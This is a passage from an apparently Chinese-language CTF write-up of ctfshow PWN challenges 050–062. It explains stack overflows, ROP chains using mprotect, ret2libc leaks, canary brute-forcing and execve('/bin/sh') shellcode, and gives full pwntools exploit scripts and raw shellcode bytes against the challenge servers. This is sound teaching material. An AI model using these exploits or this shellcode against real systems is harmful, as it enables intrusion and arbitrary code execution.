先填充缓冲区，调用mprotect函数，接着输入mprotect函数的3个参数，在此之前就要用到gadget：pop_ebx_esi_ebp_ret进行传参，按照mprotect函数的三个参数对应意义进行注入start、size、proc，这时已经给bss内存片段开放了可执行权限，然后读取read函数地址进而调用read函数，再用gadget：pop_ebx_esi_ebp_ret进行传read的3个参数，读取 后面我们所上传的shellcode 到目标内存来执行。最后上传shellcode。\n其实你可以发现这也是ret2shellcode的其中一种，只不过多加了mprotect函数控制流程罢了。\n整个流程的核心逻辑就是通过栈溢出构建 “函数调用链”，逐步完成 “开权限→写代码→执行代码” 的攻击流程。\n对于这道题而言对我感触比较深，加深我对寄存器、gadget、整个函数调用流程、参数传递过程的理解！如果你觉得很难而跳过，那你就错过了一次PWN入门者的提升机会，博主当时啃这题花了快两天时间，凌晨才写完这题的writeup呢，花点耐心去学，PWNer！\nPWN_050 题目：好像哪里不一样了；远程libc环境 Ubuntu 18。 PWN_050\n当然，你可以继续使用ret2libc来完成这题，甚至会更简单，而我的目的是为了让大家进一步学mprotect函数。\n这里叫我们启动Ubuntu 18，就ctfshow配给我们的，那我们就听劝用它的虚拟机。虽说比较老\u0026hellip;\u0026hellip;\n跟进ctfshow、main函数：\n明显看到危险的gets函数，ctfshow函数这有栈溢出漏洞：\n主要流程如下（4步payload）：\n泄漏内存地址,通过计算得到libc地址 通过mprotect函数来修改一段区域的权限，位rwx 向这段区域写入shellcode 跳转到写入shellcode的区域，并执行 我们要利用mprotect函数改变内存执行权限，那我们需要找地址，正好这次和上次一样不是页对齐：\nbss_start_address = 0x602000\n64位程序靠寄存器传参，用ROPgadget命令查询程序本身的gadget：\npop_rdi_ret = 0x00000000004007e3\n用ROPgadget命令查libc库的通用gadget：\n1 ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 pop_rdx_ret1 = 0x0000000000001b96\npop_rsi_ret1 = 0x0000000000023a6a\n前面加个1是因为，后续还有一个类似的gadget变量，好区分一些。\n为什么第一个gadget可以从程序本身去查到，而第二三个gadget地址却要在libc库获取？\n从这可以看到程序本身是不带第二、三个的gadget的，因为我们要利用漏洞去获取flag，而本身程序运行是不用后面俩的gadget的。\nexp；\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28281) elf = ELF(\u0026#39;./pwn\u0026#39;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) main = elf.sym[\u0026#39;main\u0026#39;] ctfshow = elf.sym[\u0026#39;ctfshow\u0026#39;] puts_plt = elf.plt[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] pop_rdi_ret = 0x00000000004007e3 pop_rdx_ret1 = 0x0000000000001b96 pop_rsi_ret1 = 0x0000000000023a6a bss_start_address = 0x602000 # 内存页对齐地址 size = 0x1000 proc = 0x7 # PROT_READ | PROT_WRITE | PROT_EXEC # 确保shellcode地址所在页与bss_start_address同页（或调整mprotect范围） shellcode_address = 0x602000 + 0x100 # 阶段1：泄露libc地址 payload = cyclic(0x20 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(ctfshow) io.recvuntil(b\u0026#34;Hello CTFshow\u0026#34;) io.sendline(payload) io.recvline() leak_address = u64(io.recvline().split(b\u0026#39;\\x0a\u0026#39;)[0].ljust(8, b\u0026#39;\\x00\u0026#39;)) libc_base = leak_address - libc.sym[\u0026#39;puts\u0026#39;] libc.address = libc_base # 设置libc基地址 success(\u0026#34;libc_base = 0x%x\u0026#34;, libc_base) pop_rsi_ret = libc_base + pop_rsi_ret1 pop_rdx_ret = libc_base + pop_rdx_ret1 mprotect = libc.sym[\u0026#39;mprotect\u0026#39;] gets = libc.sym[\u0026#39;gets\u0026#39;] # 阶段2：调用mprotect修改内存权限 payload = cyclic(0x20 + 8) + p64(pop_rdi_ret) + p64(bss_start_address) + p64(pop_rsi_ret) + p64(size) + p64(pop_rdx_ret) + p64(proc) + p64(mprotect) + p64(main) io.recvuntil(b\u0026#34;Hello CTFshow\u0026#34;) io.sendline(payload) io.recv() # 阶段3：利用gets写入shellcode payload = cyclic(0x20 + 8) + p64(pop_rdi_ret) + p64(shellcode_address) + p64(gets) + p64(main) io.recvuntil(b\u0026#34;Hello CTFshow\u0026#34;) io.sendline(payload) shellcode = asm(shellcraft.sh()) io.sendline(shellcode) # 阶段4：跳转到shellcode执行 payload = cyclic(0x20 + 8) + p64(shellcode_address) io.recvuntil(b\u0026#34;Hello CTFshow\u0026#34;) io.sendline(payload) io.interactive() 让我给你逐步解释：\n1 2 pop_rdx_ret1 = 0x0000000000001b96 pop_rsi_ret1 = 0x0000000000023a6a 这里前面有个1是方便区分，这两个gadget是在libc库上的通用gadget，受ASLR保护，地址是动态变化的，需要用所有函数的真实地址 = libc 基地址 + 函数的本地偏移得出地址：\n1 libc_base = leak_address - libc.sym[\u0026#39;puts\u0026#39;] 泄露puts在本地程序的地址，再泄露puts再libc库的地址推出偏移量，已知本地程序的每个函数地址偏移量相同，知道偏移量后，泄露libc标准库的gadget（/lib/x86_64-linux-gnu/libc.so.6）就能反推出本地程序gadget的真实地址：\n1 2 pop_rsi_ret = libc_base + pop_rsi_ret1 pop_rdx_ret = libc_base + pop_rdx_ret1 这里有个问题：为什么gets = libc.sym[\u0026lsquo;gets\u0026rsquo;]就是真实地址呢，你会认为它就是libc库的通用地址，是不是应该加上本地偏移量呢？\nlibc.sym['gets'] 最终是真实地址的原因是：\n它原本是 “偏移量”（相对于 libc 基地址）； 当你设置 libc.address = libc_base 后，pwntools 自动将 “基地址 + 偏移量” 合并，得到真实地址。 libc.address 不是一个函数，而是 pwntools 中 ELF 类的一个属性（attribute），用于存储和设置 ELF 文件（这里特指 libc 库）在内存中的基地址。\n当你通过 libc = ELF('libc.so.6') 加载 libc 库后，libc.address 默认值为 0（表示尚未设置基地址）。\n总的来说这题质量不错，耗了我两天空闲时间去攻克。\nPWN_051 题目：I‘m IronMan； PWN_051\nIDA抽象🤦‍😄\u0026hellip;\n跟进main函数，这次函数名字比较难记，可以改个名字：\n跟进ctfshow函数：\n很明显这是用C++写的，这里我看的不太懂，借用AI解读\u0026hellip;\n在往s中read的时候大小没有问题，但是程序在下面将字符\u0026quot;I\u0026quot;替换成 了\u0026quot;IronMan\u0026quot;，最后在strcpy的时候发生了溢出。只需要简单计算一下，那么在输入16个“I” 就会被替换为 16 * 7 = 112个字符，而s距ebp的距离为 0x6c = 108。\n正常溢出覆盖到返回地址就是 cyclic(0x6c+4) = cyclic(112) ,输入16个I刚好替换成 16个\u0026quot;IronMan\u0026quot;，刚好是112个，也就刚好覆盖到返回地址，但用其它字符比如a不可以，因为会再调用 std::string::operator+= 将输入的 \u0026quot;a\u0026quot;*112 拼接到这个固定前缀之后。此时，字符串总长度已变为 “固定前缀长度 + 112 字节”，必然超过 112 字节。\n让我发现了cat /ctfshow_flag，可以利用栈溢出来执行这个catflag的命令：\n找它地址：\n地址：804902E\nexp：\n1 2 3 4 5 6 7 8 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28216) elf = ELF(\u0026#39;./pwn\u0026#39;) get_flag = 0x804902E payload = b\u0026#34;I\u0026#34;*16 + p32(get_flag) io.sendline(payload) io.interactive() PWN_052 题目：迎面走来的flag让我如此蠢蠢欲动； PWN_052\nIDA32位分析，跟进ctfshow函数：\n让我看到了gets函数。\n跟进flag函数：\n这段 C 语言代码定义了一个名为flag的函数，主要功能是读取并输出特定文件中的内容，但有条件限制。我们来分析一下： 函数首先尝试打开/ctfshow_flag文件用于读取， 如果文件打开失败，会输出错误信息并退出程序； 如果文件打开成功，会读取文件中的内容到s数组。（最多 64 个字符）\n函数的返回逻辑： 当参数a1等于 0x36C 且a2等于 0x36D 时，使用printf(s)输出文件内容并返回；否则，直接返回fgets的结果。（即读取到的字符串）\n也就是说我们利用栈溢出漏洞覆盖返回地址，返回到这个flag函数并执行就能获得flag。\nexp：\n1 2 3 4 5 6 7 8 9 10 from pwn import * context(arch=\u0026#39;amd64\u0026#39;, os=\u0026#39;linux\u0026#39;, log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;, 28261) elf = ELF(\u0026#39;./pwn\u0026#39;) flag = elf.sym[\u0026#39;flag\u0026#39;] payload = cyclic(0x6c+4) + p32(flag) + p32(0) + p32(0x36C) + p32(0x36D) io.sendline(payload) io.recv() io.interactive() 类canary爆破 PWN_053 题目：再多一眼看一眼就会爆炸； PWN_053\nchecksec看信息\u0026hellip;.没开canary、PIE，有NX\n跟进flag函数：\n函数的执行流程如下： 定义一个 64 字节的字符数组s和一个文件指针stream。尝试打开路径为/ctfshow_flag的文件用于读取。\n如果文件打开失败（stream为 NULL），则输出错误信息并退出程序；如果文件打开成功，使用fgets从文件中读取最多 64 个字符到数组s中，通过puts(s)输出读取到的内容（会自动在末尾添加换行符），调用fflush(stdout)刷新标准输出缓冲区，并将其返回值作为函数的返回值。\n这段代码的逻辑比上一个版本更直接，不需要特定参数即可输出 flag 内容，只要成功打开文件就会直接打印文件中的内容。fflush(stdout)的作用是确保内容立即输出到终端，而不会停留在缓冲区中。也就是说只要执行到flag函数就直接给flag字符串。\n在函数目录上看到了canary函数，这还是第一次见到手动放置的canary：\n这段代码的功能是从标准输入读取用户输入的字节数，并将相应字节数的数据读取到缓冲区 buf 中。然后，它会检查堆栈的完整性，如果堆栈被破坏，则输出错误信息并终止程序。\n跟进ctfshow函数：\n解释下这段函数，也就是说开局我给程序输入一个1000，它就在后续给我设置1000容量大小的缓冲区：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // 1. 先通过 printf 提示用户输入字节数 printf(\u0026#34;How many bytes do you want to write to the buffer?\\n\u0026gt;\u0026#34;); // 2. 读取用户输入的字符串（如 \u0026#34;1000\u0026#34;）并转换为整数 nbytes while (v5 \u0026lt;= 31) { read(0, \u0026amp;v2[v5], 1u); // 读取用户输入的长度字符串（如 \u0026#34;1000\u0026#34;） if (v2[v5] == 10) break; ++v5; } __isoc99_sscanf(v2, \u0026#34;%d\u0026#34;, \u0026amp;nbytes); // 将字符串转换为整数 nbytes（如 1000） // 3. 关键指令：按照 nbytes 读取数据到缓冲区 buf printf(\u0026#34;$ \u0026#34;); read(0, buf, nbytes); // 这里的 nbytes 就是用户输入的字节数，实际执行读取操作 那输入1000，程序在后续就让我能输入1000字节的东西。\n看main函数：\n可以看到先经过canary的栈溢出检查，如果发现栈溢出立刻终止程序进行，那就得绕过这个canary保护了。\n手动放置的canary函数中的canary.txt的值是不变的，况且是4字节大小的值，也就是说我们编一个循环四次，从0~255范围找字节的双重循环就可以爆破出canary值，从而绕过memcmp的检查，实现栈溢出返回flag函数地址去执行flag函数获得flag字符串。\npython2 exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 from pwn import * import time PWN1 = \u0026#34;\u0026#34; for i in range(4): for k in range(256): io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28226) io.recvuntil(\u0026#34;How many bytes do you want to write to the buffer?\\n\u0026gt;\u0026#34;) io.sendline(\u0026#34;1000\u0026#34;) payload = cyclic(0x20) + PWN1 + chr(k) io.recvuntil(\u0026#34;$ \u0026#34;) io.send(payload) data = io.recv() print(\u0026#34;data:\u0026#34; + data) if \u0026#34;Where is the flag?\u0026#34; in data: PWN1 += chr(k) print(\u0026#34;success!!\u0026#34;) print(PWN1) break else: print(\u0026#34;NO!!\u0026#34;) io.close() time.sleep(0.1) print(\u0026#39;Canary-------------\u0026gt;:\u0026#39; + PWN1) io = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, 28226) flag_address = 0x8048696 payload = cyclic(0x20) + PWN1 + cyclic(0x10) + p32(flag_address) io.recvuntil(\u0026#34;How many bytes do you want to write to the buffer?\\n\u0026gt;\u0026#34;) io.sendline(\u0026#34;1000\u0026#34;) io.recvuntil(\u0026#34;$ \u0026#34;) io.send(payload) io.interactive() 这里定义了一个PWN1，起初为空值，只要每爆破出一位正确字节的canary值，就会通过PWN1 += chr(k)被储存进PWN1内，chr(k) 将这个整数转换为对应的字符（字节），用于拼接测试 payload，爆破 canary 的每一个字节。\n发送 payload 的方式（sendline vs send）是关键差异\n之前的题目好像对发送payload的函数并不严格要求，但在这题就必须要求严格了，要用send函数，如果是sendline的话，会在payload后面多加一个换行符\\n，因附加换行符破坏栈布局。也会导致一直循环爆破却最终爆破失败。\nPWN_054 题目：再近一点靠近点快被融化； PWN_054\nIDA32：\n跟进flag函数：\n分析main函数：\n只要密码正确，输出欢迎信息 \u0026ldquo;Welcome! Here\u0026rsquo;s what you want:\u0026quot;，然后main就会调用flag函数直接获取flag字符串；但密码不正确就会输出”You has been banned!“的提示。\n我们查看重要参数在堆栈中的位置：\n从v5和s的位置来看，它俩所处的栈位置距离比较近欸！0x160 - 0x60 = 0x100。\n这里的v5数组的容量刚好0x100可以填满，这不是巧合，突破点就在这的。当你用0x100填满v5后，正好把puts的终止符**\\x00**给破坏了，这就会导致puts继续执行，直接把s一起输出了。\n怎么判断终止符 \\x00 存储在数组内部？ 看 “数组容量” 与 “字符串最大长度” 的关系：若数组容量 \u0026gt; 字符串最大长度，终止符必在数组内部：\nv5 数组容量为 256 字节（0x100），而读取用户名的 fgets(v5, 256, stdin) 最多读取 255 字节（留 1 字节自动补 \\x00）\n判断 \\x00 是否存储在数组内部，可按优先级依次验证：\n优先看 数组容量与字符串最大长度的关系（最直接，如 数组容量 \u0026gt; 最大读取长度）； 再看 字符串的生成 / 处理函数（如 fgets 自动补 \\x00、strchr 替换生成 \\x00）； 最后看 后续字符串操作是否正常（反向验证 \\x00 位置合法）。 三者均指向 \\x00 在数组内部时，即可确定该结论。 exp1，得出密码：\n1 2 3 4 5 6 7 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28246) payload = cyclic(0x100) io.sendline(payload) io.recv() io.interactive() 整串复制，不要只复制h3r3！！\nPWN_055 题目：你是我的谁，我的我是你的谁； PWN_055\nIDA，跟进main函数：\n跟进flag函数：\n要想flag字符串被打印出来，就要满足第一个条件：flag1 \u0026amp;\u0026amp; flag2 \u0026amp;\u0026amp; a1 == 0xBDBDBDBD\nflag1、flag2须为真值，而a1要等于0xBDBDBDBD就行。\n分别跟进flag_func1、flag_func2函数：\n大致思路就是：先调用flag_func1函数，使flag1等于1，再调用flag_func2函数，满足函数条件将flag2赋值为1，最后再调用flag函数，给参数，最终打印flag字符串，exp：\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) elf = ELF(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28207) flag_func1 = elf.sym[\u0026#39;flag_func1\u0026#39;] flag_func2 = elf.sym[\u0026#39;flag_func2\u0026#39;] flag = elf.sym[\u0026#39;flag\u0026#39;] payload = cyclic(0x2c+4) + p32(flag_func1) + p32(flag_func2) + p32(flag) + p32(0xACACACAC) + p32(0xBDBDBDBD) io.recvuntil(\u0026#34;Input your flag: \u0026#34;) io.sendline(payload) io.recv() io.interactive() 1 payload = cyclic(0x2c+4) + p32(flag_func1) + p32(flag_func2) + p32(flag) + p32(0xACACACAC) + p32(0xBDBDBDBD) 这里你想必把有点懵，为什么要先flag再到参数，不是应该先执行完函数、传完参再到另外一个函数吗？感觉很乱啊\u0026hellip;.\n32 位程序调用函数时，遵循两个关键规则（这是理解 payload 的前提）：\n参数压栈顺序：函数的参数要按 “从右到左” 的顺序，依次放到栈上； 返回地址跟着参数：参数压完后，要压入 “函数执行完后要跳转到的地址”（即下一个函数的地址），最后才是 “当前要调用的函数地址”。 现在这些题目需要我们对代码具有一定阅读理解能力，理解代码的运作原理，而不再像新手入门那样无脑套ret2shellcode、ret2libc、脚本了。\n认识32位和64位的shellcode PWN_056 题目：先了解一下简单的32位shellcode吧。 PWN_056\nIDA32分析：\n这里就是送分的了，把/bin/sh赋值给v1，然后调用execve函数（类似system函数）去执行，这不就是直接终端交互吗？\nexp：\n1 2 3 4 5 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) elf = ELF(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28189) io.interactive() 现在来看汇编语言：\n1 2 3 4 5 6 7 8 9 push 0x68 push 0x732f2f2f push 0x6e69622f mov ebx,esp xor ecx,ecx xor edx,edx push 0xB pop eax int 0x80 这段代码是x86汇编语言的代码，用于在Linux系统上执行一个系统调用来执行execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL) 。让我们逐行解析代码的功能：\n1 push 0x68 这行代码将十六进制值 0x68 （104的十进制表示）压入栈中。这是为了将后续的字符串 \u0026ldquo;/bin/sh\u0026quot;的长度（11个字符）放入栈中，以便后续使用。\n1 push 0x732f2f2f 这行代码将十六进制值 0x732f2f2f 压入栈中。这是字符串 \u0026ldquo;/bin/sh\u0026rdquo; 的前半部分字符的逆序表示，即 \u0026ldquo;sh//\u0026quot;。这是因为x86架构是小端字节序的，字符串需要以逆序方式存储在内存中。（但其实2f2f可以换成0000，补空位，那就是0x732f0000：sh，不要//都可以的）\n1 push 0x6e69622f 这行代码将十六进制值 0x6e69622f 压入栈中。这是字符串 \u0026ldquo;/bin/sh\u0026rdquo; 的后半部分字符的逆序表示，即 \u0026ldquo;/bin\u0026rdquo;。\n1 mov ebx, esp 这行代码将栈顶的地址（即字符串 \u0026ldquo;/bin/sh\u0026rdquo; 的起始地址）复制给寄存器 ebx 。 ebx 寄存器将用作execve 系统调用的第一个参数，即要执行的可执行文件的路径。\n1 2 xor ecx, ecx xor edx, edx 这两行代码使用异或操作将 ecx 和 edx 寄存器的值设置为零。 ecx 和 edx 分别将用作 execve系统调用的第二个和第三个参数，即命令行参数和环境变量。在此情况下，我们将它们设置为 NULL，表示没有命令行参数和环境变量。（这不就是手敲shellcode的那段代码吗？在一开始的wp：PWN_024）过这么久了忘得差不多了，在这里回忆一下啊。\n1 2 push 0xB pop eax 这两行代码将值 11 （ 0xb ）压入栈中，然后从栈中弹出到寄存器 eax 。 eax 寄存器将用作系统调用号， 11 表示 execve 系统调用的系统调用号。\n1 int 0x80 这行代码触发中断 0x80 ，这是Linux系统中用于执行系统调用的中断指令。通过设置适当的寄存器值（ eax 、 ebx 、 ecx 、 edx ）， int 0x80 指令将执行 execve(\u0026quot;/bin/sh\u0026rdquo;, NULL, NULL) 系统调用，从而启动一个新的 shell 进程。\n总结起来，这段汇编代码的功能是利用系统调用在Linux系统上执行 execve(\u0026quot;/bin/sh\u0026rdquo;, NULL,NULL) ，即打开一个新的shell进程。\nPWN_057 题目：先了解一下简单的64位shellcode吧。 PWN_057\nIDA64：\n内联汇编 syscall; LINUX - 的作用 syscall：是 x86-64 架构下的汇编指令，用于触发 Linux 系统调用（调用操作系统内核提供的功能，如进程退出、文件操作等）。 LINUX - 可能是简化或注释残留，实际有效的指令只有 syscall。系统调用的具体功能由 rax 寄存器的值决定（例如 rax=60 表示 exit 系统调用，用于终止当前进程）。 总的来说这俩题是让我们认识shellcode的样子，以便后面使用\u0026hellip;\nexp同上。\n重点还是看汇编：\n1 2 3 4 5 6 7 8 9 push rax xor rdx, rdx xor rsi, rsi mov rbx,\u0026#39;/bin//sh\u0026#39; push rbx push rsp pop rdi mov al, 59 syscall 这段代码是x86-64汇编语言的代码，用于在Linux系统上执行 execve(\u0026quot;/bin/sh\u0026quot;, NULL,NULL) 。让我们逐行解析代码的功能：\n1 push rax 这行代码将 rax 寄存器的值（通常用于存放函数返回值）压入栈中。这里的目的是保留 rax 的值，以便后续使用。\n1 2 xor rdx, rdx xor rsi, rsi 这两行代码使用异或操作将 rdx 和 rsi 寄存器的值设置为零。 rdx 和 rsi 分别将用作 execve系统调用的第三个和第二个参数，即环境变量和命令行参数。在此情况下，我们将它们设置为 NULL，表示没有环境变量和命令行参数。\n1 mov rbx, \u0026#39;/bin//sh\u0026#39; 这行代码将字符串 \u0026lsquo;/bin//sh\u0026rsquo; 的地址赋值给 rbx 寄存器。字符串 \u0026lsquo;/bin//sh\u0026rsquo; 是我们要执行的可执行文件的路径。在x86-64汇编中，字符串被当作地址处理。\n1 push rbx 这行代码将 rbx 寄存器的值（字符串 \u0026lsquo;/bin//sh\u0026rsquo; 的地址）压入栈中。这是为了将可执行文件路径传递给 execve系统调用的第一个参数。\n1 2 push rsp pop rdi 这两行代码将栈顶的地址（即字符串 \u0026lsquo;/bin//sh\u0026rsquo; 的地址）弹出到 rdi 寄存器。 rdi 寄存器将用作execve 系统调用的第一个参数，即可执行文件路径。\n1 mov al, 59 这行代码将 al 寄存器设置为值 59 ， 59 是 execve 系统调用的系统调用号。\n1 syscall 这行代码触发系统调用。通过设置适当的寄存器值（ rax 、 rdi 、 rsi 、rdx）， syscall 指令将执行 execve(\u0026quot;/bin/sh\u0026quot;, NULL, NULL) 系统调用，从而启动一个新的 shell 进程。\n总结起来，这段汇编代码的功能是利用系统调用在Linux系统上执行 execve(\u0026quot;/bin/sh\u0026rdquo;, NULL,NULL) ，即打开一个新的shell进程。与前一个示例相比，这段代码是x86-64架构下的汇编代码，使用通用寄存器进行操作。\npwn_058 题目：32位 无限制。 PWN_058\n32位仅部分开启RELRO，其他保护全关，并且有可读，可写，可执行段。可以用shellcode。\n看不到源码，那就只能看汇编代码：\n大致就是：会调用puts函数\n看text段：\n这里看到调用gets函数了，参数对应的是 [ebp+s] 的地址,也就是在返回地址上一栈内存单元处，接着往下就是调用puts函数了：\n紧接着就是ctfshow函数：\n从这可看出，gets函数读入存进[ebp+s]这块的内存，到puts、ctfshow主函数都会读取其中内容调用，那我们往这块注入shellcode不就好了吗？\nexp：\n1 2 3 4 5 6 7 8 from pwn import * context(arch = \u0026#39;i386\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) elf = ELF(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28118) shellcode = asm(shellcraft.sh()) io.sendline(shellcode) io.recv() io.interactive() 当然shellcode这部分你可以选择手敲汇编代码进去，这里用了shellcraft模块。\nPWN_059 题目：64位 无限制。 PWN_059\n分析流程同上，需要注意的是在生成shellcode的时候需要注明架构为64位：\nexp：\n1 2 3 4 5 6 7 8 from pwn import * context(arch = \u0026#39;amd64\u0026#39;,os = \u0026#39;linux\u0026#39;,log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28204) shellcode = asm(shellcraft.sh()) io.sendline(shellcode) #recv() io.interactive() PWN_060 题目：入门难度shellcode。 PWN_060\nIDA32分析：\n发现gets函数。\n使用strncpy函数将对应的字符串复制到 buf2 处。跟进查看：\n可以看到buf2在bss段，地址：0x804A080\n用gdb调试查看bss是否有执行权限：\n1 2 3 4 gdb pwn run break main vmmap buf2所在的bss内存段确实有rwx权限，那我们直接注入shellcode到buf2运行就可以。\nexp：\n1 2 3 4 5 6 7 8 9 10 from pwn import * context.log_level = \u0026#39;debug\u0026#39; #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28171) buf2_address = 0x804A080 shellcode = asm(shellcraft.sh()) lenth = len(shellcode) payload = shellcode + cyclic(112-lenth) + p32(buf2_address) io.sendline(payload) io.interactive() 你会看到为什么是112？不应该是104吗？100字节+ebp本身的4字节，还有8字节哪来的？记住以下规则：\n“多填充 8 字节” 并非随意设置，而是由程序实际栈帧结构决定的—— 可能是编译器的栈对齐策略，也可能是隐式局部变量占用空间，最终通过调试确认 “只有填充至 112 字节才能覆盖返回地址”。这也符合 PWN 题的通用原则：栈溢出的填充长度需以 “实际调试 / 逆向结果” 为准，而非仅依赖理论计算的 “缓冲区大小 + 旧 EBP”。\n不过在新版本的Ubuntu虚拟机中就可能会误导你：\n灵活掌控shellcode长度 PWN_061 题目：输出了什么？ PWN_061\nchecksec查看保护信息：没栈溢出保护、没开NX，可以尝试注入shellcode：\nIDA64：\n欸我们分析这个main函数看到v5地址在每次程序运行都会打印出来，但因为是有PIE保护，所以每次地址都会随机化，所以在构造exp时需要接收这个v5地址。\ngets函数会读取v5参数然后存入内存段中。\n可以看到会打印出v5地址：\nexp大致思路是先覆盖缓冲区，然后跳转到v5地址，注入shellcode，但要注意：\n这里执行了leave指令，\n等价于两条汇编指令的组合：\nmov rsp, rbp：将栈指针 rsp（栈顶指针）指向栈底指针 rbp，此时 rsp 从 “v5 起始地址” 跳转到 “rbp 所在地址”，直接跳过 v5 占用的栈空间； pop rbp：将栈中 rbp 地址处存储的 “旧 RBP 值” 弹出到 rbp 寄存器，同时 rsp 自动增加 8 字节（64 位系统栈操作以 8 字节对齐）。 v5[0]、v5[1]、旧rbp，再加上预留给shellcode的返回地址的8字节长度，总共32字节，这32字节不能使用。等放到32之后shellcode的内容才能正被执行。\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28132) io.recvuntil(\u0026#39;[\u0026#39;) v5 = io.recvuntil(\u0026#39;]\u0026#39;, drop = True) v5 = int(v5, 16) shellcode = asm(shellcraft.sh()) payload = cyclic(0x10+8) + p64(v5+32) + shellcode io.sendline(payload) io.recv() io.interactive() 在这里解释下：\n1 2 3 io.recvuntil(\u0026#39;[\u0026#39;) v5 = io.recvuntil(\u0026#39;]\u0026#39;, drop = True) v5 = int(v5, 16) 输入流中首先接收数据直到遇到 \u0026lsquo;[\u0026rsquo; 字符为止。接下来再次从输入流中接收数据，直到遇到 \u0026lsquo;]\u0026rsquo; 字符为止，将其保存在变量 v5 中。最后，将变量 v5 解析为一个十六进制的整数，并将其存储回变量 v5 中。\np64(v5+32)，将 “v5 地址 + 32 字节” 这个目标地址，打包为 64 位小端序二进制数据，用于覆盖程序的返回地址，最终让程序跳转到该目标地址执行 shellcode\n若 v5 是字符串（如'7ffefd78ff20'），Python 无法对字符串进行加法运算，这就是为什么需要v5 = int(v5, 16)的原因。\nPWN_062 题目：短了一点。 PWN_062\nchecksec一下：\nIDA64分析：\n和上题差不多，但这里换成read函数了，read(0, buf, 56uLL)意思是读取56长度的数据到buf中。\n在text字段查看read函数附近的汇编指令：\n可以看到这里和上题一样调用完read函数后会执行leave汇编指令。\n运行程序依旧一样，有PIE保护情况下，buf地址动态变化。\n但这里有个问题是，read只读取56位长度字符，56本身减去shellcode地址长度8字节、buf的16字节长度（buf[0]、buf[1]各占8字节长度）以及ebp本身8字节，共32，即56-32=24，那就是说只留给24位长度给到shellcode的内容长度限制，pwntools的shellcraft模块的shellcode长度（29字节）超过了24。因此需要另寻shellcode，这里我推荐一个shellcode，刚好24字节长度https://www.exploit-db.com/shellcodes/43550。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 global _start section .text _start: push 59 pop rax cdq push rdx mov rbx,0x68732f6e69622f2f push rbx push rsp pop rdi push rdx push rdi push rsp pop rsi syscall 1 2 3 4 5 6 7 8 9 10 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; char code[] = \u0026#34;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\u0026#34;; // char code[] = \u0026#34;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\u0026#34;; int main() { printf(\u0026#34;len:%d bytes\\n\u0026#34;, strlen(code)); (*(void(*)()) code)(); return 0; } exp:\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * context(arch = \u0026#39;amd64\u0026#39;, os = \u0026#39;linux\u0026#39;, log_level = \u0026#39;debug\u0026#39;) #io = process(\u0026#39;./pwn\u0026#39;) io = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28310) io.recvuntil(\u0026#39;[\u0026#39;) buf_addr = io.recvuntil(\u0026#39;]\u0026#39;, drop = True) buf_address = int(buf_addr, 16) shellcode_x64 = \u0026#34;\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\u0026#34; #https://www.exploit-db.com/shellcodes/43550 payload = cyclic(0x10+8) + p64(buf_address+32) + shellcode_x64 io.sendline(payload) io.recv() io.interactive() PWN_063 题目：又短了一点。 